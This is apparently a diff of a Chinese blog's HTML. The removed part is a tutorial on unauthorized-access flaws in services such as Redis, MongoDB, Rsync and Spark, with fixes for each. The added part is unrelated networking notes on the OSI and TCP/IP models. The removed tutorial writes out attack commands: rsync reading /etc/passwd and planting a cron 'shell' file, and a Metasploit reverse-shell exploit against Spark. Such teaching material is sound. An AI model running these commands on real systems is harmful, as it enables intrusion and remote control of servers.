-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228165805.png" alt="img"></p>
-<h3 id="3-漏洞修复-12"><a href="#3-漏洞修复-12" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li>
-<li>设置防火墙策略，限定IP访问服务；</li>
-</ul>
-<h2 id="0x15-Kubernetes-Api-Server-未授权"><a href="#0x15-Kubernetes-Api-Server-未授权" class="headerlink" title="0x15 Kubernetes Api Server 未授权"></a>0x15 Kubernetes Api Server 未授权</h2><h3 id="1-漏洞简介-13"><a href="#1-漏洞简介-13" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p>
-<h3 id="2-漏洞检测-13"><a href="#2-漏洞检测-13" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
-<p>端口：8080 <code>http://10.10.4.89:8080/</code></p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228172025.jpg" alt="img"></p>
-<p>端口：8080： api dashboard：<code>http://10.10.4.89:8080/ui</code></p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228172112.jpg" alt="img"></p>
-<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228172146.jpg" alt="img"></p>
-<h3 id="3-漏洞修复-13"><a href="#3-漏洞修复-13" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>进行授权认证；</li>
-<li>使用Service Account令牌；</li>
-<li>设置防火墙策略，限定IP访问服务；</li>
-</ul>
-<h2 id="0x16-LDAP-未授权访问"><a href="#0x16-LDAP-未授权访问" class="headerlink" title="0x16 LDAP 未授权访问"></a>0x16 LDAP 未授权访问</h2><h3 id="1-漏洞简介-14"><a href="#1-漏洞简介-14" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p>
-<h3 id="2-漏洞检测-14"><a href="#2-漏洞检测-14" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228224739.jpg" alt="img"></p>
-<h3 id="3-漏洞修复-14"><a href="#3-漏洞修复-14" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>修改ldap的acl，禁止匿名访问。</li>
-<li>根据业务设置ldap访问白名单或黑名单；</li>
-</ul>
-<h2 id="0x17-MongoDB-未授权访问"><a href="#0x17-MongoDB-未授权访问" class="headerlink" title="0x17 MongoDB 未授权访问"></a>0x17 MongoDB 未授权访问</h2><h3 id="1-漏洞简介-15"><a href="#1-漏洞简介-15" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
-<p>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>
-<h3 id="2-漏洞检测-15"><a href="#2-漏洞检测-15" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>安装mongodb，然后连接到服务。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install mongodb</span><br><span class="line">mongo --host 10.2.20.34 --port 27017</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228162817.jpg" alt="img"></p>
-<h3 id="3-漏洞修复-15"><a href="#3-漏洞修复-15" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>限制绑定IP，启动时加入参数<code>--bind_ip 127.0.0.1</code>或在<code>/etc/mongodb.conf</code>文件中添加以下内容：<code>bind_ip = 127.0.0.1</code>；</li>
-<li>在<code>admin.system.users</code>中添加用户，启动认证；</li>
-<li>设置防火墙策略，限定 IP 访问服务；</li>
-<li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数<code>nohttpinterface=false</code>；</li>
-</ul>
-<h2 id="0x18-Memcached-未授权访问"><a href="#0x18-Memcached-未授权访问" class="headerlink" title="0x18 Memcached 未授权访问"></a>0x18 Memcached 未授权访问</h2><h3 id="1-漏洞简介-16"><a href="#1-漏洞简介-16" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。</p>
-<h3 id="2-漏洞检测-16"><a href="#2-漏洞检测-16" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.4.89 11211</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">nc -vv 11211</span><br></pre></td></tr></table></figure>
-
-<p>使用了 stats 命令来输出 Memcached 服务信息</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228163347.jpg" alt="img"></p>
-<h3 id="3-漏洞修复-16"><a href="#3-漏洞修复-16" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>修改绑定的IP、端口和指定访问者IP；</li>
-<li>设置防火墙策略；</li>
-<li>禁止暴露在公网；</li>
-<li>配置memcached监听本地回环地址 <code>127.0.0.1</code>；</li>
-</ul>
-<h2 id="0x19-NFS-未授权访问"><a href="#0x19-NFS-未授权访问" class="headerlink" title="0x19 NFS 未授权访问"></a>0x19 NFS 未授权访问</h2><h3 id="1-漏洞简介-17"><a href="#1-漏洞简介-17" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。</p>
-<h3 id="2-漏洞检测-17"><a href="#2-漏洞检测-17" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装nfs客户端</span></span><br><span class="line">apt install nfs-common</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看nfs服务器上的共享目录</span></span><br><span class="line">showmount -e 192.168.126.130 </span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载相应共享目录到本地</span></span><br><span class="line">mount -t nfs 192.168.126.130:/grdata /mnt </span><br><span class="line"></span><br><span class="line"><span class="comment">#卸载目录</span></span><br><span class="line">umount /mnt</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-17"><a href="#3-漏洞修复-17" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>利用iptables限制端口2049和20048端口的访问，禁止外部访问；</li>
-<li>设置&#x2F;etc&#x2F;exports，对访问进行控制；</li>
-</ul>
-<h2 id="0x20-Rsync-未授权访问"><a href="#0x20-Rsync-未授权访问" class="headerlink" title="0x20 Rsync 未授权访问"></a>0x20 Rsync 未授权访问</h2><h3 id="1-漏洞简介-18"><a href="#1-漏洞简介-18" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>rsync是Linux&#x2F;Unix下的一个远程数据同步工具，可通过LAN&#x2F;WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p>
-<h3 id="2-漏洞检测-18"><a href="#2-漏洞检测-18" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/rsync/common</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>使用Rsync命令即可进行检测。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/</span><br><span class="line">rsync rsync://192.168.126.130:873/src</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228230511.png" alt="img"></p>
-<p>利用rsync下载任意文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228230926.png" alt="img"></p>
-<p>或者写入任意文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228231451.png" alt="img"></p>
-<h3 id="3-漏洞修复-18"><a href="#3-漏洞修复-18" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>隐藏 module 信息：修改配置文件 list &#x3D;false。</li>
-<li>权限控制：不需要写入权限的 module 的设置为只读 Read only &#x3D; true;</li>
-<li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问;</li>
-<li>账户认证：只允许指定的用户利用指定的密码使用 rsync 服务;</li>
-<li>数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh;</li>
-</ul>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106103949639.png" alt="image-20220106103949639"></p>
+<h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>吞吐量（throughput）表示在单位时间内通过某个网络（或信道、接口）的数据量</p>
+<p>吞吐量受网络的带宽或网络的额定速率的限制</p>
+<h2 id="总时延"><a href="#总时延" class="headerlink" title="总时延"></a>总时延</h2><p>数据经历的总时延就是发送时延、传输时延、处理时延和队列时延的总和</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106104331468.png" alt="image-20220106104331468"></p>
+<h2 id="丢包率及抖动"><a href="#丢包率及抖动" class="headerlink" title="丢包率及抖动"></a>丢包率及抖动</h2><blockquote>
+<p>丢包率</p>
+</blockquote>
+<p>报文在传递过程中因为各种原因导致的丢包率</p>
 <blockquote>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202771.html">https://www.freebuf.com/column/202771.html</a></p>
+<p>抖动</p>
 </blockquote>
-<h2 id="0x21-Redis-未授权访问"><a href="#0x21-Redis-未授权访问" class="headerlink" title="0x21 Redis 未授权访问"></a>0x21 Redis 未授权访问</h2><h3 id="1-漏洞简介-19"><a href="#1-漏洞简介-19" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p>
-<p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
-<h3 id="2-漏洞检测-19"><a href="#2-漏洞检测-19" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>kali安装redis-cli远程连接工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-stable </span><br><span class="line">make </span><br><span class="line"><span class="built_in">cp</span> src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>
+<p>报文传递延迟发送的变化</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106104753988.png" alt="image-20220106104753988"></p>
+<h2 id="新建、并发"><a href="#新建、并发" class="headerlink" title="新建、并发"></a>新建、并发</h2><blockquote>
+<p>四层</p>
+</blockquote>
+<p>新建（TCP SYN，看CPU）、并发（看内存）</p>
+<blockquote>
+<p>七层</p>
+</blockquote>
+<p>新建（ http&#x2F;tcp 更看CPU）、并发（看内存）</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106105210199.png" alt="image-20220106105210199"></p>
 
-<p>使用redis-cli命令直接远程免密登录redis主机</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标主机IP</span><br></pre></td></tr></table></figure>
+      
+    </div>
 
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20200823165859.png" alt="img"></p>
-<h3 id="3-漏洞修复-19"><a href="#3-漏洞修复-19" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>禁止使用root权限启动redis服务；</li>
-<li>对redis访问启动密码认证；</li>
-<li>添加IP访问限制，并更改默认6379端口；</li>
-</ul>
-<h2 id="0x22-RabbitMQ-未授权访问"><a href="#0x22-RabbitMQ-未授权访问" class="headerlink" title="0x22 RabbitMQ 未授权访问"></a>0x22 RabbitMQ 未授权访问</h2><h3 id="1-漏洞简介-20"><a href="#1-漏洞简介-20" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。 消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p>
-<h3 id="2-漏洞检测-20"><a href="#2-漏洞检测-20" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>默认账号密码都是guest</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.4.89:15672</span><br><span class="line">http://10.10.4.89:25672/</span><br><span class="line">http://10.10.4.89:15692/</span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201230102205.png" alt="img"></p>
-<h3 id="3-漏洞修复-20"><a href="#3-漏洞修复-20" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>修改为强密码，删除默认的账号guest；</li>
-<li>禁止对外网开放，仅限于内部访问；</li>
-</ul>
-<h2 id="0x23-Solr-未授权访问"><a href="#0x23-Solr-未授权访问" class="headerlink" title="0x23 Solr 未授权访问"></a>0x23 Solr 未授权访问</h2><h3 id="1-漏洞简介-21"><a href="#1-漏洞简介-21" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p>
-<h3 id="2-漏洞检测-21"><a href="#2-漏洞检测-21" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>敏感目录扫描时加上一条 &#x2F;solr&#x2F;admin</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.com/solr/admin</span><br><span class="line">https://xx.xx.com/solr/admin</span><br></pre></td></tr></table></figure>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201230103118.png" alt="img"></p>
-<h3 id="3-漏洞修复-21"><a href="#3-漏洞修复-21" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>配置solr访问控制权限；</li>
-<li>禁止将solr暴露在公网；</li>
-</ul>
-<h2 id="0x24-SpringBoot-Actuator-未授权访问"><a href="#0x24-SpringBoot-Actuator-未授权访问" class="headerlink" title="0x24 SpringBoot Actuator 未授权访问"></a>0x24 SpringBoot Actuator 未授权访问</h2><h3 id="1-漏洞简介-22"><a href="#1-漏洞简介-22" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p>
-<h3 id="2-漏洞检测-22"><a href="#2-漏洞检测-22" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问相关路径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.20.48/autoconfig</span><br></pre></td></tr></table></figure>
 
-<table>
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/TCPIP%E5%8D%8F%E8%AE%AE%E7%B0%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/11/TCPIP%E5%8D%8F%E8%AE%AE%E7%B0%87/" class="post-title-link" itemprop="url">TCP/IP协议簇</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-11 10:47:59" itemprop="dateCreated datePublished" datetime="2023-01-11T10:47:59+08:00">2023-01-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 12:52:35" itemprop="dateModified" datetime="2023-03-08T12:52:35+08:00">2023-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="TCP-x2F-IP协议簇"><a href="#TCP-x2F-IP协议簇" class="headerlink" title="TCP&#x2F;IP协议簇"></a>TCP&#x2F;IP协议簇</h1><hr>
+<h1 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>OSI模式是一个来描述通信系统的七层模型</p>
+<p>OSI模型是一个分层框架，目的是能够设计出让各类计算机系统都能互相通信的网络系统。每一层都定义了信息通过网络传输的完整过程的一部分，每一层都有独立的分工，但是各层之间又是相互联系的，处于一台机器上的每一层都要调用紧挨的下一层服务</p>
+<p>层之间存在一个接口，确保了数据能逐层向下传输，又能逐层向上交付，每一层都有一个字段去定义上一层提供了什么服务，。定义清晰的接口和功能可以使得网络模块化</p>
+<p>封装是OSI模型数据通信的一个特点，上层的数据会封装到下一层中，以此类推</p>
+<h2 id="七层模型及功能介绍"><a href="#七层模型及功能介绍" class="headerlink" title="七层模型及功能介绍"></a>七层模型及功能介绍</h2><table>
 <thead>
 <tr>
-<th align="left">请求方式</th>
-<th align="left">URL路径</th>
-<th align="left">功能描述</th>
+<th>七层</th>
+<th>功能</th>
+<th>常用协议</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">get</td>
-<td align="left">&#x2F;autoconfig</td>
-<td align="left">提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
+<td>应用层</td>
+<td>为应用程序提供服务</td>
+<td>FTP、HTTP、SMTP、TFTP</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;configprops</td>
-<td align="left">描述配置属性（包含默认值）如何注入 Bean</td>
+<td>表示层</td>
+<td>数据格式转化、数据加密</td>
+<td>Telnet、SNMP</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;beans</td>
-<td align="left">描述应用程序上下文里全部的 Bean，以及它们的关系</td>
+<td>会话层</td>
+<td>建立、管理和维护会话</td>
+<td>DNS</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;dump</td>
-<td align="left">获取线程活动的快照</td>
+<td>传输层</td>
+<td>建立、管理和维护端到端的连接</td>
+<td>TCP、UDP</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;env</td>
-<td align="left">获取全部环境属性</td>
+<td>网络层</td>
+<td>IP选址及路由选择</td>
+<td>IP、ICMP、ARP</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;env&#x2F;{name}</td>
-<td align="left">根据名称获取特定的环境属性值</td>
+<td>数据链路层</td>
+<td>提供介质访问和链路管理</td>
+<td>FDDI、Ethernet、HDLC协议</td>
 </tr>
 <tr>
-<td align="left">get</td>
-<td align="left">&#x2F;health</td>
-<td align="left">报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
-</tr>
-<tr>
-<td align="left">get</td>
-<td align="left">&#x2F;info</td>
-<td align="left">获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
-</tr>
-<tr>
-<td align="left">get</td>
-<td align="left">&#x2F;mappings</td>
-<td align="left">描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
-</tr>
-<tr>
-<td align="left">get</td>
-<td align="left">&#x2F;metrics</td>
-<td align="left">报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
-</tr>
-<tr>
-<td align="left">get</td>
-<td align="left">&#x2F;metrics&#x2F;{name}</td>
-<td align="left">报告指定名称的应用程序度量值</td>
-</tr>
-<tr>
-<td align="left">post</td>
-<td align="left">&#x2F;shutdown</td>
-<td align="left">关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
-</tr>
-<tr>
-<td align="left">get</td>
-<td align="left">&#x2F;trace</td>
-<td align="left">提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
+<td>物理层</td>
+<td>传输比特流、定义物理设备标准</td>
+<td></td>
 </tr>
 </tbody></table>
-<h3 id="3-漏洞修复-22"><a href="#3-漏洞修复-22" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>禁用&#x2F;env接口；</li>
-<li>升级到SpringBoot Actuator 2.0；</li>
-<li>禁止对外开放；</li>
-</ul>
-<h2 id="0x25-Spark-未授权访问"><a href="#0x25-Spark-未授权访问" class="headerlink" title="0x25 Spark 未授权访问"></a>0x25 Spark 未授权访问</h2><h3 id="1-漏洞简介-23"><a href="#1-漏洞简介-23" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p>
-<h3 id="2-漏洞检测-23"><a href="#2-漏洞检测-23" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>nmap扫描出如下端口开放，则很有可能存在漏洞</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6066/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8081/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8082/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201230103502.png" alt="img"></p>
-<p>使用msf工具getshell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line">msf5&gt;<span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line">msf5&gt;<span class="built_in">set</span> rhost 192.168.100.2</span><br><span class="line">msf5&gt;<span class="built_in">set</span> rport 6066</span><br><span class="line">msf5&gt;<span class="built_in">set</span> lhost 192.168.100.1</span><br><span class="line">msf5&gt;<span class="built_in">set</span> lport 4444</span><br><span class="line">msf5&gt;<span class="built_in">set</span> srvhost 192.168.100.1</span><br><span class="line">msf5&gt;<span class="built_in">set</span> srvport 8080</span><br><span class="line">msf5&gt;exploit </span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-23"><a href="#3-漏洞修复-23" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>对外关闭敏感端口；</li>
-<li>配置用户权限认证；</li>
-</ul>
+<h2 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h2><p>pc-a 向pc-b的过程</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106144857345.png" alt="image-20220106144857345"></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、上三层协议是为用户提供服务；下四层负责实际数据传输</p>
+<p>2、传输单元 传输层（数据段 报文）、网络层（数据包 报文分组）、数据链路层（数据帧）、物理层（比特 位）</p>
+<p>3、越上层越智能，可以识别当前层以下的数据；越下层越傻瓜，贴近硬件</p>
+<p>4、数据传输时数据从上层向下层传输，接收时数据从下层向上层传输</p>
+<p>5、数据不能跨区传输，每层之间通过逻辑的接口传递</p>
+<p>6、物理层负责实际数据传输，其它层只是逻辑应对</p>
+<h1 id="TCP-x2F-IP协议簇-1"><a href="#TCP-x2F-IP协议簇-1" class="headerlink" title="TCP&#x2F;IP协议簇"></a>TCP&#x2F;IP协议簇</h1><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106150022933.png" alt="image-20220106150022933"></p>
+<h2 id="TCP-x2F-IP四层模型"><a href="#TCP-x2F-IP四层模型" class="headerlink" title="TCP&#x2F;IP四层模型"></a>TCP&#x2F;IP四层模型</h2><p>TCP&#x2F;IP协议簇是一个四层协议系统，自底向上为数据链路层、网络层、传输层、应用层。</p>
+<p>每一层完成不同的功能，且通过若干协议来实现，上层协议使用下层协议提供的服务</p>
 <blockquote>
